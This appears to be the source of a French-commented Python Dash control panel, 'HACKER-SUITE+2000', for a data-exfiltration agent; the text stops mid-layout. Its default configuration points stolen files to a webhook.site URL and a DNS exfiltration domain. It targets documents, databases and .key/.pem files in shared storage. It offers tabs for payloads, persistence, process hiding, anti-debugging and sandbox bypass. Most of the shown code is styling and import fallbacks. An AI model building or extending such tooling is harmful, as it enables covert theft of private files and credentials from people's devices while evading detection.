import dash
from dash import dcc, html, dash_table
from dash.dependencies import Input, Output, State, ALL, MATCH
import subprocess
import shlex
import os
import time
import json
import sys
import base64
import signal
import re
import shutil
from datetime import datetime

# --- Nettoyage du cache Python (important pour les mises à jour de modules) ---
def clean_pycache():
    """Supprime les répertoires __pycache__ pour forcer la relecture des modules."""
    for root, dirs, files in os.walk(os.path.dirname(os.path.abspath(__file__))):
        if '__pycache__' in dirs:
            shutil.rmtree(os.path.join(root, '__pycache__'))

clean_pycache()

# --- IMPORTS DE TES MODULES (s'assurer que le chemin est correct) ---
AGENT_DIR = os.path.dirname(os.path.abspath(__file__))
# Assurez-vous que AGENT_DIR est ajouté une seule fois au sys.path,
# et surtout avant tout import de 'modules.*' pour éviter les 'Fallback INFO'.
if AGENT_DIR not in sys.path:
    sys.path.insert(0, AGENT_DIR)

# --- Définition d'un Logger/Mock pour compatibilité (priorité élevée) ---
_GLOBAL_MODULE_LOGGER = None
try:
    from modules.logger import Logger as AgentLogger
    _GLOBAL_MODULE_LOGGER = AgentLogger(log_file_path=None, cipher_key=None, debug_mode=True, stdout_enabled=False)
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.logger.Logger importé et configuré.")
except ImportError as e:
    class UIMockLoggerFallback:
        def __init__(self): pass
        def log_debug(self, msg): print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [MOCK_DEBUG] {msg}")
        def log_info(self, msg): print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [MOCK_INFO] {msg}")
        def log_warning(self, msg): print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [MOCK_WARNING] {msg}")
        def log_error(self, msg): print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [MOCK_ERROR] {msg}")
        def log_critical(self, msg): print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [MOCK_CRITICAL] {msg}")
        def get_new_logs(self, last_index: int = 0) -> tuple[list[str], int]: return [], 0
        def reset_logs(self): pass

    _GLOBAL_MODULE_LOGGER = UIMockLoggerFallback()
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] AVERTISSEMENT: modules.logger.Logger non trouvé. Utilisation de UIMockLoggerFallback.")
except Exception as e:
    _GLOBAL_MODULE_LOGGER = UIMockLoggerFallback()
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur lors de l'initialisation de modules.logger.Logger: {e}. Utilisation de UIMockLoggerFallback.")


# --- Initialisation du LogStreamer global (sera activé via callback) ---
# Il est crucial que global_log_streamer soit une instance unique,
# même lors des rechargements de Flask en mode debug.
global_log_streamer = None
try:
    from modules.log_streamer import LogStreamer
    # Utiliser une variable de module pour stocker l'instance du streamer
    # afin de la rendre persistante à travers les rechargements (si possible)
    # ou au moins de la rendre unique pour l'instance actuelle de l'application.
    if not hasattr(sys, '_global_log_streamer_instance'):
        sys._global_log_streamer_instance = LogStreamer(max_buffer_lines=1000)
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] LogStreamer module trouvé. Instance créée. Sera activé au démarrage du serveur.")
    global_log_streamer = sys._global_log_streamer_instance
except ImportError as e:
    class MockLogStreamer:
        def __init__(self, max_buffer_lines: int = 1000):
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: LogStreamer module non trouvé. Les logs en direct de l'UI seront limités.")
        def start_capturing(self): pass
        def stop_capturing(self): pass
        def write(self, message: str): pass
        def flush(self): pass
        def get_logs(self, last_index: int = 0) -> tuple[list[str], int]: return [], 0
        def clear_logs(self): pass
    global_log_streamer = MockLogStreamer()
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.log_streamer: {e}. Les logs en direct ne seront pas disponibles.")


explorer_log_states = {
    'file_explorer': {'last_index': 0, 'logs': []},
    'web_explorer': {'last_index': 0, 'logs': []}
}

# --- Définition des classes Mock/Fallback pour les explorateurs ---
class BaseMockExplorer:
    TARGET_TYPE_FILE = "file"
    TARGET_TYPE_DIRECTORY = "directory"

    def __init__(self, debug_mode: bool = False):
        self._LOGGER = _GLOBAL_MODULE_LOGGER
        # Mettre à jour le message pour éviter le "Fallback INFO" si le module réel est censé être là
        if self.__class__.__name__ == "BaseMockExplorer": # Seulement si c'est le mock directement instancié
             self._LOGGER.log_warning(f"[{self.__class__.__name__}] Module non importé, utilisant un mock.")


    def explore_path(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité explore_path non implémentée (mock).")
        return []

    def explore_url(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité explore_url non implémentée (mock).")
        return []

    def read_file_content(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité read_file_content non implémentée (mock).")
        return "[ERROR] Explorer module is not available."

    def read_file_content_from_url(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité read_file_content_from_url non implémentée (mock).")
        return "[ERROR] Explorer module is not available."

    def download_file_base64(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité download_file_base64 non implémentée (mock).")
        return "[ERROR] Explorer module is not available."

    def download_file_base64_from_url(self, *args, **kwargs):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité download_file_base64_from_url non implémentée (mock).")
        return "[ERROR] Explorer module is not available."

    def get_found_targets(self):
        return []

    def reset_state(self):
        self._LOGGER.log_info(f"[{self.__class__.__name__}] État réinitialisé (mock).")
        pass


# --- Tente d'importer les modules réels, utilise les mocks si l'import échoue ---
# L'ordre est important ! On importe les modules réels APRES avoir configuré sys.path
# et AVANT d'instancier les explorateurs globaux.
OriginalFileExplorer = BaseMockExplorer
OriginalWebExplorer = BaseMockExplorer
AES256Cipher = None

try:
    from modules.file_explorer import FileExplorer as ImportedFileExplorer
    OriginalFileExplorer = ImportedFileExplorer
    # Assurez-vous que le LOGGER est bien assigné après l'import si la classe a un _LOGGER statique ou de classe
    # Si la classe l'initialise elle-même, assurez-vous qu'elle utilise _GLOBAL_MODULE_LOGGER
    if hasattr(OriginalFileExplorer, '_LOGGER'):
        OriginalFileExplorer._LOGGER = _GLOBAL_MODULE_LOGGER
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.file_explorer.FileExplorer importé avec succès.")
except ImportError as e:
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.file_explorer: {e}. Les fonctionnalités de File Explorer seront limitées.")

try:
    from modules.web_explorer import WebExplorer as ImportedWebExplorer
    OriginalWebExplorer = ImportedWebExplorer
    if hasattr(OriginalWebExplorer, '_LOGGER'):
        OriginalWebExplorer._LOGGER = _GLOBAL_MODULE_LOGGER
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.web_explorer.WebExplorer importé avec succès.")
except ImportError as e:
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.web_explorer: {e}. Les fonctionnalités de Web Explorer seront limitées.")

try:
    from modules.aes256 import AES256Cipher as ImportedAES256Cipher
    AES256Cipher = ImportedAES256Cipher
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.aes256.AES256Cipher importé avec succès.")
except ImportError as e:
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.aes256: {e}. Le chiffrement des logs ne sera pas disponible.")

try:
    from modules.system_profiler import SystemProfiler as ImportedSystemProfiler
    # Assurez-vous que SystemProfiler est instancié avec le GLOBAL_MODULE_LOGGER
    if hasattr(sys, '_global_system_profiler_instance'): # Pour éviter la réinitialisation en mode debug
        global_system_profiler = sys._global_system_profiler_instance
    else:
        global_system_profiler = ImportedSystemProfiler(logger=_GLOBAL_MODULE_LOGGER)
        sys._global_system_profiler_instance = global_system_profiler
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.system_profiler.SystemProfiler importé et instancié avec succès.")
except ImportError as e:
    class MockSystemProfiler:
        def __init__(self, logger=None):
            self._log = logger.log_warning if logger else lambda msg: print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [MOCK_WARNING] [MockSystemProfiler] {msg}")
            self._log("Module SystemProfiler non importé, utilisant un mock.")
        def collect_system_info(self):
            self._log("info", "Fonctionnalité de profilage système non disponible (mock).")
            return {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "status": "ERROR: SystemProfiler module not found or failed to import.",
                "details": str(e)
            }
    global_system_profiler = MockSystemProfiler(logger=_GLOBAL_MODULE_LOGGER)
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.system_profiler: {e}. Les fonctionnalités de System Profiler seront limitées. Utilisation de MockSystemProfiler.")


# Crée les instances globales des explorateurs, en s'assurant qu'elles sont uniques et utilisent le logger global.
if not hasattr(sys, '_global_file_explorer_instance'):
    sys._global_file_explorer_instance = OriginalFileExplorer(debug_mode=True)
global_file_explorer = sys._global_file_explorer_instance

if not hasattr(sys, '_global_web_explorer_instance'):
    sys._global_web_explorer_instance = OriginalWebExplorer(debug_mode=True)
global_web_explorer = sys._global_web_explorer_instance


# --- Configuration des Chemins ---
AGENT_PATH = os.path.join(AGENT_DIR, 'exf_agent.py')
LOG_FILE_PATH = os.path.join(AGENT_DIR, 'agent_logs.enc')
SHARED_CONFIG_FILE = os.path.join(AGENT_DIR, 'shared_config.json')

# --- Globals pour l'état du processus de l'agent ---
running_agent_process = None
agent_output_buffer = []

# --- Fonctions utilitaires ---
def generate_aes_key(length: int = 32) -> str:
    """Génère une clé AES aléatoire de la longueur spécifiée (en bytes) et l'encode en Base64."""
    return base64.urlsafe_b64encode(os.urandom(length)).decode('utf-8').rstrip('=')

def load_shared_config():
    """Charge la configuration depuis le fichier JSON partagé."""
    config_data = {}
    if os.path.exists(SHARED_CONFIG_FILE):
        try:
            with open(SHARED_CONFIG_FILE, 'r') as f:
                config_data = json.load(f)
            _GLOBAL_MODULE_LOGGER.log_info(f"Fichier de configuration partagé '{SHARED_CONFIG_FILE}' chargé.")
        except json.JSONDecodeError:
            _GLOBAL_MODULE_LOGGER.log_error(f"Le fichier '{SHARED_CONFIG_FILE}' est corrompu. Recréation forcée lors de la première sauvegarde.")
        except Exception as e:
            _GLOBAL_MODULE_LOGGER.log_error(f"Erreur lors du chargement de la config partagée '{SHARED_CONFIG_FILE}': {e}")
    return config_data

def save_shared_config(config_data: dict):
    """Sauvegarde la configuration dans le fichier JSON partagé."""
    try:
        with open(SHARED_CONFIG_FILE, 'w') as f:
            json.dump(config_data, f, indent=4)
        _GLOBAL_MODULE_LOGGER.log_info(f"Configuration sauvegardée dans '{SHARED_CONFIG_FILE}'.")
    except Exception as e:
            _GLOBAL_MODULE_LOGGER.log_error(f"Impossible de sauvegarder la configuration dans '{SHARED_CONFIG_FILE}': {e}")

# --- Charger/Générer la configuration au démarrage de l'application Dash ---
shared_config_data = load_shared_config()

if not shared_config_data or 'aes_key' not in shared_config_data:
    _GLOBAL_MODULE_LOGGER.log_info("Génération d'une nouvelle configuration partagée (clé AES et valeurs par défaut).")
    shared_config_data = {
        "aes_key": generate_aes_key(),
        "default_target_url": "https://webhook.site/VOTRE_URL_UNIQUE_ICI",
        "default_scan_path": os.path.expanduser('~') + "/storage/shared",
        "default_file_types": ".doc,.docx,.txt,.pdf,.xls,.xlsx,.csv,.db,.sqlite,.json,.xml,.key,.pem,.pptx,.log,.md",
        "default_exclude_types": ".exe,.dll,.sys,.bin,.tmp,.py,.sh,.bak,.old",
        "default_min_size": "1k",
        "default_max_size": "100M",
        "default_dns_server": "8.8.8.8",
        "default_dns_domain": "exfil.yourdomain.com",
        "default_keywords": "",
        "default_regex_patterns": "",
        "default_payload_url": "",
        "default_payload_path": "",
        "default_threads": 4, # Valeur par défaut numérique, ne pas en faire une liste par erreur
        "default_debug_mode": True,
        "default_no_clean": True,
        "default_no_anti_evasion": False,
        "default_explorer_target_host": "http://127.0.0.1",
        "default_explorer_base_path": "/var/www/html" if os.path.exists("/var/www/html") else "",
        "default_explorer_depth": 3,
        "default_exfil_method": "https",
        "default_stealth_hide_process": [],
        "default_stealth_anti_debug": [],
        "default_stealth_sandbox_bypass": [],
    }
    save_shared_config(shared_config_data)
    _GLOBAL_MODULE_LOGGER.log_warning(f"Veuillez remplacer l'URL 'https://webhook.site/VOTRE_URL_UNIQUE_ICI' dans le fichier '{SHARED_CONFIG_FILE}' par votre URL webhook.site via l'interface ou manuellement !")

# --- Valeurs par défaut de l'UI (utilisées dans le layout) ---
DEFAULT_AES_KEY = shared_config_data.get('aes_key', '')
DEFAULT_TARGET_URL = shared_config_data.get('default_target_url', '')
DEFAULT_SCAN_PATH = shared_config_data.get('default_scan_path', os.path.expanduser('~'))
DEFAULT_FILE_TYPES = shared_config_data.get('default_file_types', '')
DEFAULT_EXCLUDE_TYPES = shared_config_data.get('default_exclude_types', '')
DEFAULT_MIN_SIZE = shared_config_data.get('default_min_size', '1k')
DEFAULT_MAX_SIZE = shared_config_data.get('default_max_size', '100M')
DEFAULT_DNS_SERVER = shared_config_data.get('default_dns_server', '8.8.8.8')
DEFAULT_DNS_DOMAIN = shared_config_data.get('default_dns_domain', '')
DEFAULT_KEYWORDS = shared_config_data.get('default_keywords', '')
DEFAULT_REGEX_PATTERNS = shared_config_data.get('default_regex_patterns', '')
DEFAULT_PAYLOAD_URL = shared_config_data.get('default_payload_url', '')
DEFAULT_PAYLOAD_PATH = shared_config_data.get('default_payload_path', '')
DEFAULT_THREADS = shared_config_data.get('default_threads', 4)
DEFAULT_DEBUG_MODE = ['debug'] if shared_config_data.get('default_debug_mode', True) else []
DEFAULT_NO_CLEAN = ['no-clean'] if shared_config_data.get('default_no_clean', True) else []
DEFAULT_NO_ANTI_EVASION = ['no-anti-evasion'] if shared_config_data.get('default_no_anti_evasion', False) else []
DEFAULT_EXPLORER_TARGET_HOST = shared_config_data.get('default_explorer_target_host', "http://127.0.0.1")
DEFAULT_EXPLORER_BASE_PATH = shared_config_data.get('default_explorer_base_path', "")
DEFAULT_EXPLORER_DEPTH = shared_config_data.get('default_explorer_depth', 3)
DEFAULT_EXFIL_METHOD = shared_config_data.get('default_exfil_method', 'https')
DEFAULT_STEALTH_HIDE_PROCESS = shared_config_data.get('default_stealth_hide_process', [])
DEFAULT_STEALTH_ANTI_DEBUG = shared_config_data.get('default_stealth_anti_debug', [])
DEFAULT_STEALTH_SANDBOX_BYPASS = shared_config_data.get('default_stealth_sandbox_bypass', [])


# --- Initialisation de l'application Dash ---
app = dash.Dash(__name__, title="HACKER-SUITE+2000",
                external_stylesheets=[
                    'https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap' # J'ai corrigé la fin de l'URL pour qu'elle soit complète
                ],
                prevent_initial_callbacks='initial_duplicate',
                assets_folder=os.path.join(AGENT_DIR, 'display')
               )

app.config.suppress_callback_exceptions = True


# --- Styles CSS pour un thème "Cyber Ops Pro :: Metallic Noir" ---
CYBER_OPS_STYLE = {
    'backgroundColor': '#0A0A0A',
    'color': '#00EEFF',
    'fontFamily': '"Roboto Mono", "Consolas", "Courier New", monospace',
    'padding': '0',
    'margin': '0',
    # --- MODIFICATIONS ICI ---
    # Ces propriétés étaient la cause du blocage de défilement sur mobile
    # car elles forçaient le div racine à prendre toute la hauteur de la fenêtre
    # et à se comporter en flexbox.
    # 'minHeight': '100vh',
    # 'display': 'flex',
    # 'flexDirection': 'column',
    'overflowY': 'auto',  # Permet au contenu de défiler si la hauteur dépasse
    'overflowX': 'hidden', # Empêche le défilement horizontal indésirable
    # --- FIN MODIFICATIONS ---
    'fontSize': '14px',
    'backgroundImage': 'linear-gradient(to bottom right, #0A0A0A, #1A1A1A)',
    'backgroundAttachment': 'fixed',
}

CYBER_HEADER_STYLE = {
    'textAlign': 'center',
    'color': '#7FFF00',
    'padding': '25px 0',
    'marginBottom': '0px',
    'textShadow': '0 0 20px rgba(127,255,0,0.9), 0 0 30px rgba(127,255,0,0.6)',
    'fontSize': '3em',
    'fontWeight': 'bold',
    'letterSpacing': '5px',
    'borderBottom': '2px solid #005500',
    'backgroundColor': '#1C1C1C',
    'boxShadow': '0 4px 10px rgba(0,0,0,0.5)',
    'textTransform': 'uppercase'
}

CYBER_TABS_CONTAINER_STYLE = {
    'backgroundColor': '#101010',
    'borderBottom': '2px solid #004400',
    'paddingLeft': '20px',
    'paddingRight': '20px',
    'paddingTop': '10px',
    'maxWidth': '1100px',
    'margin': '0 auto',
    'borderRadius': '0 0 8px 8px',
    'boxShadow': '0 5px 15px rgba(0,0,0,0.3)'
}

CYBER_TAB_STYLE = {
    'backgroundColor': '#1E1E1E',
    'color': '#00AACC',
    'border': '1px solid #333333',
    'borderBottom': 'none',
    'borderRadius': '6px 6px 0 0',
    'padding': '15px 30px',
    'marginRight': '8px',
    'fontSize': '1.3em',
    'fontWeight': 'bold',
    'textTransform': 'uppercase',
    'letterSpacing': '1.5px',
    'transition': 'all 0.2s ease-in-out',
    'cursor': 'pointer',
    'boxShadow': 'inset 0 2px 5px rgba(0,0,0,0.2)'
}

CYBER_TAB_SELECTED_STYLE = {
    'backgroundColor': '#004400',
    'color': '#7FFF00',
    'border': '1px solid #7FFF00',
    'borderBottom': 'none',
    'borderRadius': '6px 6px 0 0',
    'padding': '15px 30px',
    'marginRight': '8px',
    'fontSize': '1.3em',
    'fontWeight': 'bold',
    'textTransform': 'uppercase',
    'letterSpacing': '1.5px',
    'cursor': 'default',
    'boxShadow': 'inset 0 3px 8px rgba(0,0,0,0.3), 0 0 15px rgba(127,255,0,0.5)'
}

CYBER_SECTION_CONTENT_STYLE = {
    'padding': '40px',
    'maxWidth': '1100px',
    'margin': '30px auto',
    'backgroundColor': '#101010',
    'borderRadius': '10px',
    'boxShadow': '0 0 30px rgba(0,255,65,0.1), inset 0 0 10px rgba(0,255,65,0.05)',
    'border': '1px solid #006600',
    'flexGrow': '1',
    'position': 'relative',
    'overflow': 'hidden',
}

CYBER_SECTION_HEADER_STYLE = {
    'color': '#FF00FF',
    'borderBottom': '1px dashed #550055',
    'paddingBottom': '18px',
    'marginBottom': '30px',
    'textShadow': '0 0 10px rgba(255,0,255,0.7)',
    'fontSize': '2em',
    'fontWeight': 'bold',
    'letterSpacing': '2px',
    'textTransform': 'uppercase',
}

CYBER_INPUT_WRAPPER_STYLE = {
    'display': 'flex',
    'alignItems': 'center',
    'marginBottom': '20px',
    'gap': '12px'
}

CYBER_INPUT_STYLE = {
    'flexGrow': '1',
    'padding': '15px',
    'backgroundColor': '#050505',
    'border': '1px solid #005500',
    'borderRadius': '4px',
    'color': '#7FFF00',
    'boxSizing': 'border-box',
    'boxShadow': 'inset 0 0 8px rgba(0,255,65,0.08)',
    'fontSize': '1.1rem',
    'outline': 'none',
    'transition': 'border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out',
    'appearance': 'none',
    'fontFamily': '"Roboto Mono", monospace',
}

CYBER_BUTTON_BASE = {
    'padding': '16px 32px',
    'border': 'none',
    'borderRadius': '4px',
    'cursor': 'pointer',
    'fontSize': '1.2rem',
    'fontWeight': 'bold',
    'transition': 'all 0.2s ease-in-out',
    'textTransform': 'uppercase',
    'letterSpacing': '1.5px',
    # --- AJOUTS ICI pour la flexibilité des boutons eux-mêmes ---
    'flex': '1 1 150px', # Permet aux boutons de grandir/rétrécir (base de 150px)
    'minWidth': '150px', # S'assure qu'ils ne deviennent pas trop petits
    'maxWidth': 'calc(50% - 7.5px)', # Empêche d'être trop larges si seulement 2 boutons sur une ligne
                                   # (50% moins la moitié du gap ajusté de 15px)
    # --- FIN AJOUTS ---
    'background': 'linear-gradient(145deg, #2A2A2A, #1A1A1A)',
    'boxShadow': '5px 5px 10px rgba(0,0,0,0.3), -5px -5px 10px rgba(30,30,30,0.2)',
    'border': '1px solid #333333',
    'fontFamily': '"Roboto Mono", monospace',
}

CYBER_BUTTON_PRIMARY = {
    **CYBER_BUTTON_BASE,
    'color': '#0A0A0A',
    'backgroundImage': 'linear-gradient(145deg, #7FFF00, #4CAF50)',
    'boxShadow': '0 0 25px rgba(127,255,0,0.8), 5px 5px 10px rgba(0,0,0,0.4), -5px -5px 10px rgba(120,255,0,0.1)',
    'marginTop': '30px',
    'marginRight': '15px',
    'border': '1px solid #66CC00'
}

CYBER_BUTTON_SECONDARY = {
    **CYBER_BUTTON_BASE,
    'color': '#0A0A0A',
    'backgroundImage': 'linear-gradient(145deg, #00BFFF, #0077AA)',
    'boxShadow': '0 0 20px rgba(0,191,255,0.6), 5px 5px 10px rgba(0,0,0,0.3), -5px -5px 10px rgba(0,191,255,0.1)',
    'marginTop': '30px',
    'marginRight': '15px',
    'border': '1px solid #0099CC'
}

CYBER_BUTTON_DANGER = {
    **CYBER_BUTTON_BASE,
    'color': '#FFFFFF',
    'backgroundImage': 'linear-gradient(145deg, #FF3333, #AA0000)',
    'boxShadow': '0 0 25px rgba(255,0,0,0.8), 5px 5px 10px rgba(0,0,0,0.4), -5px -5px 10px rgba(255,0,0,0.1)',
    'marginTop': '30px',
    'marginLeft': '15px',
    'border': '1px solid #CC0000'
}

CYBER_BUTTON_APPLY = {
    'backgroundColor': '#E5C07B',
    'color': '#0A0A0A',
    'padding': '12px 20px',
    'border': 'none',
    'borderRadius': '3px',
    'cursor': 'pointer',
    'fontSize': '0.9rem',
    'fontWeight': 'bold',
    'boxShadow': '0 0 10px rgba(229,192,123,0.6)',
    'transition': 'all 0.1s ease-in-out',
    'flexShrink': '0',
    'background': 'linear-gradient(145deg, #E5C07B, #C29F64)',
    'border': '1px solid #AA8855',
    'fontFamily': '"Roboto Mono", monospace',
}

CYBER_BUTTON_APPLY_ACTIVE = {
    **CYBER_BUTTON_APPLY,
    'backgroundColor': '#00A000',
    'boxShadow': '0 0 12px rgba(0,160,0,0.8)',
    'color': '#FFFFFF',
    'background': 'linear-gradient(145deg, #00CC00, #008800)',
    'border': '1px solid #006600'
}


CYBER_STATUS_BOX_STYLE = {
    'backgroundColor': '#080808',
    'padding': '25px',
    'borderRadius': '6px',
    'overflowX': 'auto',
    'whiteSpace': 'pre-wrap',
    'wordWrap': 'break-word',
    'color': '#7FFF00',
    'border': '1px solid #004400',
    'minHeight': '180px',
    'maxHeight': '450px',
    'overflowY': 'auto',
    'boxShadow': 'inset 0 0 10px rgba(0,255,65,0.05)',
    'fontSize': '0.95rem',
    'lineHeight': '1.5',
    'fontFamily': '"Roboto Mono", monospace',
}
CYBER_STATUS_ERROR = {**CYBER_STATUS_BOX_STYLE, 'color': '#FF5555', 'border': '1px solid #CC3333'}
CYBER_STATUS_WARNING = {**CYBER_STATUS_BOX_STYLE, 'color': '#FFEE77', 'border': '1px solid #CCAA55'}
CYBER_STATUS_INFO = {**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF', 'border': '1px solid #00AAAA'}

CYBER_TABLE_HEADER_STYLE = {
    'backgroundColor': '#151515',
    'color': '#00FFFF',
    'fontWeight': 'bold',
    'border': '1px solid #005500',
    'textAlign': 'center',
    'padding': '15px',
    'textTransform': 'uppercase',
    'letterSpacing': '1px',
    'fontSize': '1rem',
    'background': 'linear-gradient(145deg, #1A1A1A, #0A0A0A)',
    'boxShadow': 'inset 0 2px 5px rgba(0,0,0,0.3)',
    'fontFamily': '"Roboto Mono", monospace',
}

CYBER_TABLE_CELL_STYLE = {
    'backgroundColor': '#080808',
    'color': '#00EEFF',
    'border': '1px solid #002200',
    'padding': '12px',
    'whiteSpace': 'normal',
    'height': 'auto',
    'textAlign': 'left',
    'fontSize': '0.9rem',
    'fontFamily': '"Roboto Mono", monospace',
}

CYBER_ACTION_BUTTON_TABLE_STYLE = {
    'backgroundColor': '#00AACC',
    'color': '#0A0A0A',
    'border': 'none',
    'borderRadius': '3px',
    'padding': '8px 12px',
    'margin': '4px',
    'cursor': 'pointer',
    'fontSize': '0.8rem',
    'fontWeight': 'bold',
    'boxShadow': '0 0 8px rgba(0,170,204,0.5)',
    'textTransform': 'uppercase',
    'transition': 'all 0.15s ease-in-out',
    'background': 'linear-gradient(145deg, #00CCEE, #0099BB)',
    'fontFamily': '"Roboto Mono", monospace',
}
CYBER_DOWNLOAD_BUTTON_TABLE_STYLE = {
    'backgroundColor': '#AA00AA',
    'color': '#0A0A0A',
    'border': 'none',
    'borderRadius': '3px',
    'padding': '8px 12px',
    'margin': '4px',
    'cursor': 'pointer',
    'fontSize': '0.8rem',
    'fontWeight': 'bold',
    'boxShadow': '0 0 8px rgba(170,0,170,0.5)',
    'textTransform': 'uppercase',
    'transition': 'all 0.15s ease-in-out',
    'background': 'linear-gradient(145deg, #EE00EE, #BB00BB)',
    'fontFamily': '"Roboto Mono", monospace',
}


# --- STYLE POUR LE TABLEAU DE BORD STATISTIQUE ---
CYBER_STAT_CARD_STYLE = {
    'backgroundColor': '#151515',
    'border': '1px solid #005500',
    'borderRadius': '8px',
    'padding': '20px',
    'textAlign': 'center',
    'boxShadow': '0 0 15px rgba(0,255,65,0.1)',
    'flex': '1 1 200px',
    'margin': '10px',
    'minWidth': '220px',
    'height': '150px',
    'display': 'flex',
    'flexDirection': 'column',
    'justifyContent': 'center',
    'fontFamily': '"Roboto Mono", monospace',
}

CYBER_STAT_VALUE_STYLE = {
    'fontSize': '2.5em',
    'fontWeight': 'bold',
    'color': '#7FFF00',
    'textShadow': '0 0 10px rgba(127,255,0,0.7)',
    'marginBottom': '5px'
}

CYBER_STAT_LABEL_STYLE = {
    'fontSize': '0.9em',
    'color': '#00FFFF',
    'textTransform': 'uppercase',
    'letterSpacing': '1px'
}

# --- Fonction pour lire le contenu de index.html ---
def get_display_html_content():
    try:
        # Chemin relatif au fichier control_panel.py
        html_path = os.path.join(AGENT_DIR, 'display', 'index.html')
        with open(html_path, 'r', encoding='utf-8') as f:
            return f.read()
    except Exception as e:
        _GLOBAL_MODULE_LOGGER.log_error(f"Erreur lors de la lecture de index.html: {e}")
        return "<h1>Erreur de chargement de l'affichage dynamique</h1><p>Impossible de charger le contenu de l'interface d'affichage.</p>"


# --- Layout de l'application Dash ---
app.layout = html.Div(style=CYBER_OPS_STYLE, children=[
    # L'en-tête H1 va ici
    html.H1([
        "HACKER-SUITE",
        html.Br(),
        "+2000"
    ], style={
        **CYBER_HEADER_STYLE,
        'color': '#FF0000', # Changé pour un rouge vif
        'textShadow': '0 0 20px rgba(255,0,0,0.9), 0 0 30px rgba(255,0,0,0.6)',
        'fontSize': '3.5em',
        'letterSpacing': '8px'
    }),

    # Les onglets DCC vont ici
    dcc.Tabs(
        id="cyber-tabs",
        value='tab-dynamic-display', # METTEZ CETTE VALEUR ICI pour qu'il soit s>
        parent_className='custom-tabs-container',
        className='custom-tabs',
        children=[
            # DYNAMIC DISPLAY est maintenant le premier onglet dans la liste
            dcc.Tab(label=':: DYNAMIC DISPLAY ::', value='tab-dynamic-display', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: DASHBOARD ::', value='tab-dashboard', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: AGENT CONTROL ::', value='tab-agent-control', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: FILE EXPLORER ::', value='tab-file-explorer', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: SYSTEM PROFILER ::', value='tab-system-profiler', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: PAYLOADS & PERSISTENCE ::', value='tab-payloads', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: STEALTH & EVASION ::', value='tab-stealth', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: LOGS & STATUS ::', value='tab-logs-status', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
        ],
        style={**CYBER_TABS_CONTAINER_STYLE}
    ), # <-- Cette parenthèse fermante a été ajoutée pour le dcc.Tabs

    # Conservez flexGrow: '1' ici, c'est ce qui permet au contenu de l'onglet de s'étendre
    # et au reste de la page (tabs et header) de rester en haut.
    html.Div(id='tabs-content', style={'flexGrow': '1'}),

    # --- Éléments cachés pour persister l'état (TOUS SONT dcc.Input ou html.Pre) ---
    html.Div(id='hidden-elements', style={'display': 'none'}, children=[
        # Un dcc.Store simple pour déclencher l'initialisation du LogStreamer
        dcc.Store(id='log-streamer-init-trigger', data=0),

        dcc.Interval(
            id='interval-explorer-logs',
            interval=1 * 1000, # Rafraîchit toutes les 1 seconde
            n_intervals=0
        ),
        dcc.Interval(
            id='interval-dashboard-refresh',
            interval=2 * 1000, # Rafraîchit toutes les 2 secondes
            n_intervals=0
        ),

        # NOUVEL EMPLACEMENT UNIQUE POUR LES LOGS DE L'EXPLORATEUR (tampon toujours présent)
        html.Pre(id='_hidden_explorer_logs_buffer', style={'display': 'none'}),
        
        # Déplacé ici pour être toujours présent (celui que le dashboard et logs/status liront)
